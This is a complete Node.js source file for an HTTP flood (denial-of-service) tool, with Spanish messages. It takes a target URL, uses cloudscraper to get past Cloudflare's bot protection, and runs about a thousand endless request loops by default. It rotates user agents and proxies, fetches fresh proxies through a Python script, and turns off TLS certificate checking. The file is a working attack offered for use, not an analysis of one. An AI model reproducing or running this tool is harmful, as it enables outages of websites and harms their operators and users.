'use strict';
require('events').EventEmitter.prototype._maxListeners = 100;
var HttpsProxyAgent = require('https-proxy-agent');
const cloudscraper = require('cloudscraper');
const args = require('minimist')(process.argv.slice(2));
const fs = require('fs');
const userAgents = require('./userAgents').userAgents();
const site = args['attack'];
const threads = args['threads'] || 1000;
const proxy = args['proxy'] == "true";
const updateproxy = args['updateproxy'] == "true";
const checkproxy = true;
let globalProxies = [];
let useProxy = false;
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

if (typeof site === 'undefined') {
  console.log('Ingresa un url');
  return;
}

if (isNaN(threads)) {
  console.log('Ingresa un numero para los threads');
  return;
}

function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

function createThread() {
  let options = {
    uri: site,
    cloudflareTimeout: 10000,
    headers: {
      'User-Agent': userAgents[getRandomInt(userAgents.length - 2)],
      'Cache-Control': 'private',
      'Accept': 'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5'
    },
  };

  if (useProxy) {
    options.agent = new HttpsProxyAgent(globalProxies[getRandomInt(globalProxies.length - 1)]);
  }

  return cloudscraper(options);
}

async function infiniteThread() {
  while (true) {
    try {
      await createThread();
      console.log("bypassed");
    } catch (e) {
      console.log(e.name + " => "+ (e.cause || e.statusCode) + ` || type ${e.errorType}`);
    }
  }
}

async function loadProxies() {
  console.log("testing proxies...");
  const proxiesText = fs.readFileSync('proxy.txt', 'utf8');
  const proxies = proxiesText != null && proxiesText.length > 0 ? proxiesText.split('\n') : null;

  if (proxies == null || proxies.length == 0)
    return [];

  let validProxies = [];
  for (let index = 0; index < proxies.length - 1; index++) {
    const proxy = 'http://' + proxies[index];
    validProxies.push(proxy);
  }

  console.log(`${validProxies.length} valid proxies`);
  return validProxies;
}

async function downloadProxy() {
  if (!updateproxy)
    return "";

  var spawn = require("child_process").spawn;
  var command = "./HiberProxy.py";
  var checkparameter = "n";

  if (checkproxy) {
    var checkparameter = "y";
  }
  else {
    var checkparameter = "n";
  }

  return await new Promise((resolve, reject) => {
    var process = spawn("python3", [command, "--checkproxy", checkparameter]);
    console.log("Actualizando proxys... espera");

    process.on('close', function (code) {
      resolve(code);
    });
    process.stdout.on('data', function (data) {
      console.log(data.toString());
    });
    process.stderr.on('data', (data) => {
      console.error(data.toString());
    });
  });
}

async function start() {

  try {
    await downloadProxy();
  } catch (e) { }

  if (proxy) {
    const validProxies = await loadProxies();
    if (validProxies.length > 0) {
      useProxy = true;
      globalProxies = validProxies;
    }
  }

  console.log("starting attack => " + site);
  for (let index = 0; index < threads; index++) {
    infiniteThread();
  }
}

start();
